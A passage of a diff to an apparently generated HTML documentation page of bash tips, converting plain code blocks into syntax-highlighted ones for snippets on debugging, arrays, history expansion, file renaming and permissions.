+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>date<span class="w"> </span><span class="s2">&quot;+%F %T%z </span><span class="nv">$0</span><span class="s2"> This is stdout, and will be written to the log&quot;</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>date<span class="w"> </span><span class="s2">&quot;+%F %T%z </span><span class="nv">$0</span><span class="s2"> This is stderr, and will also be written to the log&quot;</span>
+</span></code></pre></div>
+<h3 id="show-size-of-each-users-home-folder">Show size of each user's home folder<a class="headerlink" href="#show-size-of-each-users-home-folder" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>getent<span class="w"> </span>passwd<span class="w"> </span><span class="p">|</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="k">while</span><span class="w"> </span><span class="nv">IFS</span><span class="o">=</span>:<span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>user<span class="w"> </span>_<span class="w"> </span>uid<span class="w"> </span>_<span class="w"> </span>_<span class="w"> </span>home<span class="w"> </span>_<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$uid</span><span class="w"> </span>-ge<span class="w"> </span><span class="m">500</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$user</span><span class="s2"> &quot;</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">    </span>sudo<span class="w"> </span>du<span class="w"> </span>-sh<span class="w"> </span><span class="nv">$home</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">  </span><span class="k">fi</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="k">done</span>
+</span></code></pre></div>
+<h3 id="previous-commands-args">Previous command's args<a class="headerlink" href="#previous-commands-args" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>mkdir<span class="w"> </span>temp<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>!!:*
+</span></code></pre></div>
 <p>Be aware of the location of the tokens. For example:</p>
-<pre><code class="language-bash">mkdir -p {foo,bar}/{a,b,c}
-stat !!:*
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="o">{</span>foo,bar<span class="o">}</span>/<span class="o">{</span>a,b,c<span class="o">}</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>stat<span class="w"> </span>!!:*
+</span></code></pre></div>
 <p>This creates a problem because you can't <code>stat -p</code> so you must <code>stat -p !!:2*</code></p>
-<h3 id="debug-a-script">Debug a script</h3>
+<h3 id="debug-a-script">Debug a script<a class="headerlink" href="#debug-a-script" title="Permanent link">&para;</a></h3>
 <p>This will show everything bash is executing</p>
-<pre><code class="language-bash">bash -x scriptname.sh
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>bash<span class="w"> </span>-x<span class="w"> </span>scriptname.sh
+</span></code></pre></div>
 <p>Or debug with a function:</p>
-<pre><code class="language-bash">function debug {
-  if [ &quot;${debug:-0}&quot; -gt 0 ] ; then
-    echo &quot;$@&quot; 2&gt;&amp;1
-  fi
-}
-</code></pre>
-<h3 id="debug-nested-scripts">Debug nested scripts</h3>
-<pre><code>PS4=&quot;+(\${BASH_SOURCE}:\${LINENO}): \${FUNCNAME[0]:+\${FUNCNAME[0]}(): }&quot; bash -x some-command
-</code></pre>
-<h3 id="find-where-all-the-inodes-are">Find where all the inodes are</h3>
-<pre><code class="language-bash">find ~/ -type d -print0 |
-xargs -I %% -0 bash -c &quot;echo -n %% ; ls -a '%%' | wc -l&quot; &gt;&gt; ~/inodes.txt
-</code></pre>
-<h3 id="build-and-print-an-array">Build and print an array</h3>
-<pre><code class="language-bash">array=(&quot;one is the first element&quot;);
-array+=(&quot;two is the second element&quot; &quot;three is the third&quot;);
-echo &quot;${array[@]}&quot;
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="k">function</span><span class="w"> </span>debug<span class="w"> </span><span class="o">{</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">debug</span><span class="k">:-</span><span class="nv">0</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>-gt<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$@</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="w">  </span><span class="k">fi</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="o">}</span>
+</span></code></pre></div>
+<h3 id="debug-nested-scripts">Debug nested scripts<a class="headerlink" href="#debug-nested-scripts" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>PS4=&quot;+(\${BASH_SOURCE}:\${LINENO}): \${FUNCNAME[0]:+\${FUNCNAME[0]}(): }&quot; bash -x some-command
+</span></code></pre></div>
+<h3 id="find-where-all-the-inodes-are">Find where all the inodes are<a class="headerlink" href="#find-where-all-the-inodes-are" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>find<span class="w"> </span>~/<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span>-print0<span class="w"> </span><span class="p">|</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>xargs<span class="w"> </span>-I<span class="w"> </span>%%<span class="w"> </span>-0<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo -n %% ; ls -a &#39;%%&#39; | wc -l&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/inodes.txt
+</span></code></pre></div>
+<h3 id="build-and-print-an-array">Build and print an array<a class="headerlink" href="#build-and-print-an-array" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nv">array</span><span class="o">=(</span><span class="s2">&quot;one is the first element&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nv">array</span><span class="o">+=(</span><span class="s2">&quot;two is the second element&quot;</span><span class="w"> </span><span class="s2">&quot;three is the third&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">array</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&quot;</span>
+</span></code></pre></div>
 <p>This is useful for building command line strings. For example, <code>gpsbabel</code> requires each input file to be prepended with <code>-f</code>. The following script takes a list of files and uses a bash array to create a command line in the form of <code>gpsbabel -i gpx -f input_file_1.gpx -f input_file_2.gpx -o gpx -F output.gpx</code></p>
-<pre><code class="language-bash">##!/usr/bin/env bash
-
-## Check for at least one argument, print usage if fail
-if [ $# -lt 2 ] ; then
-    echo &quot;This script merges gpx files and requires at least two gpx files passed as arguments. Output is output.gpx&quot;;
-    echo &quot;Usage:    $0 &lt;gpx file&gt; &lt;gpx file&gt; [...&lt;gpx file&gt;]&quot;;
-    exit 1;
-fi
-
-## Create an array of arguments to pass to gpsbabel
-args=();
-for item in &quot;$@&quot; ; do
-    if [ -f &quot;$item&quot; ] || [ -h &quot;$item&quot; ] ; then
-        args+=( &quot;-f&quot; &quot;$item&quot; );
-    else
-        echo &quot;Skipping $item, it's not a file or symlink.&quot;
-    fi
-done;
-
-## Verify we have at least two files to work with
-if [ &quot;${#args[@]}&quot; -lt 4 ] ; then
-    echo &quot;We don't have enough actual files to work with. Exiting.&quot;
-    exit 1
-fi
-
-gpsbabel -i gpx &quot;${args[@]}&quot; -o gpx -F output.gpx
-</code></pre>
-<h3 id="build-and-print-an-associative-array-dict-hash">Build and print an associative array (dict, hash)</h3>
-<pre><code class="language-bash">declare -A animals=(
-  [&quot;cow&quot;]=&quot;moo&quot;
-  [&quot;dog&quot;]=&quot;woof woof&quot;
-  [&quot;cat&quot;]=&quot;meow&quot;
-) ;
-for animal in &quot;${!animals[@]}&quot; ; do
-  echo &quot;The $animal says '${animals[$animal]}'&quot; ;
-done ;
-</code></pre>
-<h3 id="show-permissions-in-rwx-and-octal-format">Show permissions in rwx and octal format</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1">##!/usr/bin/env bash</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="c1">## Check for at least one argument, print usage if fail</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;This script merges gpx files and requires at least two gpx files passed as arguments. Output is output.gpx&quot;</span><span class="p">;</span>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Usage:    </span><span class="nv">$0</span><span class="s2"> &lt;gpx file&gt; &lt;gpx file&gt; [...&lt;gpx file&gt;]&quot;</span><span class="p">;</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span><span class="p">;</span>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="k">fi</span>
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="c1">## Create an array of arguments to pass to gpsbabel</span>
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="nv">args</span><span class="o">=()</span><span class="p">;</span>
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="k">for</span><span class="w"> </span>item<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$@</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$item</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-h<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$item</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="w">        </span><span class="nv">args</span><span class="o">+=(</span><span class="w"> </span><span class="s2">&quot;-f&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$item</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">)</span><span class="p">;</span>
+</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="w">    </span><span class="k">else</span>
+</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Skipping </span><span class="nv">$item</span><span class="s2">, it&#39;s not a file or symlink.&quot;</span>
+</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a><span class="w">    </span><span class="k">fi</span>
+</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a><span class="k">done</span><span class="p">;</span>
+</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a>
+</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a><span class="c1">## Verify we have at least two files to work with</span>
+</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${#</span><span class="nv">args</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;We don&#39;t have enough actual files to work with. Exiting.&quot;</span>
+</span><span id="__span-21-23"><a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a><span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
+</span><span id="__span-21-24"><a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a><span class="k">fi</span>
+</span><span id="__span-21-25"><a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a>
+</span><span id="__span-21-26"><a id="__codelineno-21-26" name="__codelineno-21-26" href="#__codelineno-21-26"></a>gpsbabel<span class="w"> </span>-i<span class="w"> </span>gpx<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">args</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>-o<span class="w"> </span>gpx<span class="w"> </span>-F<span class="w"> </span>output.gpx
+</span></code></pre></div>
+<h3 id="build-and-print-an-associative-array-dict-hash">Build and print an associative array (dict, hash)<a class="headerlink" href="#build-and-print-an-associative-array-dict-hash" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">declare</span><span class="w"> </span>-A<span class="w"> </span><span class="nv">animals</span><span class="o">=(</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="w">  </span><span class="o">[</span><span class="s2">&quot;cow&quot;</span><span class="o">]=</span><span class="s2">&quot;moo&quot;</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="w">  </span><span class="o">[</span><span class="s2">&quot;dog&quot;</span><span class="o">]=</span><span class="s2">&quot;woof woof&quot;</span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="w">  </span><span class="o">[</span><span class="s2">&quot;cat&quot;</span><span class="o">]=</span><span class="s2">&quot;meow&quot;</span>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="o">)</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="k">for</span><span class="w"> </span>animal<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="p">!animals[@]</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;The </span><span class="nv">$animal</span><span class="s2"> says &#39;</span><span class="si">${</span><span class="nv">animals</span><span class="p">[</span><span class="nv">$animal</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="k">done</span><span class="w"> </span><span class="p">;</span>
+</span></code></pre></div>
+<h3 id="show-permissions-in-rwx-and-octal-format">Show permissions in rwx and octal format<a class="headerlink" href="#show-permissions-in-rwx-and-octal-format" title="Permanent link">&para;</a></h3>
 <p>Linux:</p>
-<pre><code class="language-bash">stat -c '%A %a %n' filename
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>stat<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;%A %a %n&#39;</span><span class="w"> </span>filename
+</span></code></pre></div>
 <p>OSX:</p>
-<pre><code class="language-bash">stat -f '%A %N' filename
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>stat<span class="w"> </span>-f<span class="w"> </span><span class="s1">&#39;%A %N&#39;</span><span class="w"> </span>filename
+</span></code></pre></div>
 <p>See <a href="../stat/">stat</a> for more stat usage.</p>
-<h3 id="find-the-length-of-a-variable">Find the length of a variable</h3>
-<pre><code class="language-bash">echo ${#SHELL}
-</code></pre>
-<h3 id="print-all-variables-that-start-with-the-substring-sh">Print all variables that start with the substring <code>SH</code></h3>
-<pre><code class="language-bash">echo &quot;${!SH@}&quot;
-</code></pre>
-<h3 id="tertiary-type-variables">Tertiary type variables</h3>
-<pre><code class="language-bash">${V:-empty} # means &quot;return the value of the variable V or the string 'empty' if $V isn't set.
-</code></pre>
-<h3 id="do-a-command-and-if-it-returns-false-so-some-more-stuff">Do a command, and if it returns false, so some more stuff</h3>
-<pre><code class="language-bash">until command_that_will_fail ; do something_else ; done ;
-</code></pre>
-<h3 id="print-two-digit-months">Print two digit months</h3>
+<h3 id="find-the-length-of-a-variable">Find the length of a variable<a class="headerlink" href="#find-the-length-of-a-variable" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">echo</span><span class="w"> </span><span class="si">${#</span><span class="nv">SHELL</span><span class="si">}</span>
+</span></code></pre></div>
+<h3 id="print-all-variables-that-start-with-the-substring-sh">Print all variables that start with the substring <code>SH</code><a class="headerlink" href="#print-all-variables-that-start-with-the-substring-sh" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="p">!SH@</span><span class="si">}</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<h3 id="tertiary-type-variables">Tertiary type variables<a class="headerlink" href="#tertiary-type-variables" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="si">${</span><span class="nv">V</span><span class="k">:-</span><span class="nv">empty</span><span class="si">}</span><span class="w"> </span><span class="c1"># means &quot;return the value of the variable V or the string &#39;empty&#39; if $V isn&#39;t set.</span>
+</span></code></pre></div>
+<h3 id="do-a-command-and-if-it-returns-false-so-some-more-stuff">Do a command, and if it returns false, so some more stuff<a class="headerlink" href="#do-a-command-and-if-it-returns-false-so-some-more-stuff" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="k">until</span><span class="w"> </span>command_that_will_fail<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>something_else<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span><span class="p">;</span>
+</span></code></pre></div>
+<h3 id="print-two-digit-months">Print two digit months<a class="headerlink" href="#print-two-digit-months" title="Permanent link">&para;</a></h3>
 <p><code>echo {1..12}</code> may not work. If not, use <code>echo $(seq -w 1 12)</code></p>
-<h3 id="get-filename-extension-or-path">Get filename, extension or path</h3>
+<h3 id="get-filename-extension-or-path">Get filename, extension or path<a class="headerlink" href="#get-filename-extension-or-path" title="Permanent link">&para;</a></h3>
 <p>Taken from <a href="http://mywiki.wooledge.org/BashFAQ/073">http://mywiki.wooledge.org/BashFAQ/073</a></p>
-<h3 id="rename-files-to-a-sequence-and-change-their-extension-at-the-same-time">Rename files to a sequence and change their extension at the same time</h3>
-<pre><code class="language-bash">ls | while read -r line ; do
-  stub=${line%.*} ;
-  (( i += 1 )) ;
-  mv &quot;${line}&quot; &quot;${i}-${stub}.txt3&quot; ;
-done ;
-</code></pre>
-<pre><code class="language-bash">FullPath=/path/to/name4afile-00809.ext   # result:   #   /path/to/name4afile-00809.ext
-Filename=${FullPath##*/}                             #   name4afile-00809.ext
-PathPref=${FullPath%&quot;$Filename&quot;}                     #   /path/to/
-FileStub=${Filename%.*}                              #   name4afile-00809
-FileExt=${Filename#&quot;$FileStub&quot;}                      #   .ext
-</code></pre>
-<h3 id="sort-a-line-by-spaces">Sort a line by spaces</h3>
-<pre><code class="language-bash">s=( whiskey tango foxtrot );
-sorted=$(printf &quot;%s\n&quot;` `${s[@]}|sort);
-echo $sorted
-</code></pre>
-<h3 id="calculate-the-difference-between-two-dates">Calculate the difference between two dates</h3>
-<pre><code class="language-bash">echo $(( $(gdate +%s -d 20120203) - $(gdate +%s -d 20120115) ))
-</code></pre>
-<h3 id="substring-replace-a-variable">substring replace a variable</h3>
+<h3 id="rename-files-to-a-sequence-and-change-their-extension-at-the-same-time">Rename files to a sequence and change their extension at the same time<a class="headerlink" href="#rename-files-to-a-sequence-and-change-their-extension-at-the-same-time" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>ls<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>line<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="w">  </span><span class="nv">stub</span><span class="o">=</span><span class="si">${</span><span class="nv">line</span><span class="p">%.*</span><span class="si">}</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="w">  </span><span class="o">((</span><span class="w"> </span><span class="nv">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">))</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="w">  </span>mv<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">line</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="s2">-</span><span class="si">${</span><span class="nv">stub</span><span class="si">}</span><span class="s2">.txt3&quot;</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="k">done</span><span class="w"> </span><span class="p">;</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="nv">FullPath</span><span class="o">=</span>/path/to/name4afile-00809.ext<span class="w">   </span><span class="c1"># result:   #   /path/to/name4afile-00809.ext</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nv">Filename</span><span class="o">=</span><span class="si">${</span><span class="nv">FullPath</span><span class="p">##*/</span><span class="si">}</span><span class="w">                             </span><span class="c1">#   name4afile-00809.ext</span>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="nv">PathPref</span><span class="o">=</span><span class="si">${</span><span class="nv">FullPath</span><span class="p">%</span><span class="s2">&quot;</span><span class="nv">$Filename</span><span class="s2">&quot;</span><span class="si">}</span><span class="w">                     </span><span class="c1">#   /path/to/</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="nv">FileStub</span><span class="o">=</span><span class="si">${</span><span class="nv">Filename</span><span class="p">%.*</span><span class="si">}</span><span class="w">                              </span><span class="c1">#   name4afile-00809</span>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="nv">FileExt</span><span class="o">=</span><span class="si">${</span><span class="nv">Filename</span><span class="p">#</span><span class="s2">&quot;</span><span class="nv">$FileStub</span><span class="s2">&quot;</span><span class="si">}</span><span class="w">                      </span><span class="c1">#   .ext</span>
+</span></code></pre></div>
+<h3 id="sort-a-line-by-spaces">Sort a line by spaces<a class="headerlink" href="#sort-a-line-by-spaces" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nv">s</span><span class="o">=(</span><span class="w"> </span>whiskey<span class="w"> </span>tango<span class="w"> </span>foxtrot<span class="w"> </span><span class="o">)</span><span class="p">;</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="nv">sorted</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%s\n&quot;</span><span class="sb">`</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nv">s</span><span class="p">[@]</span><span class="si">}</span><span class="p">|</span>sort<span class="k">)</span><span class="p">;</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$sorted</span>
+</span></code></pre></div>
+<h3 id="calculate-the-difference-between-two-dates">Calculate the difference between two dates<a class="headerlink" href="#calculate-the-difference-between-two-dates" title="Permanent link">&para;</a></h3>
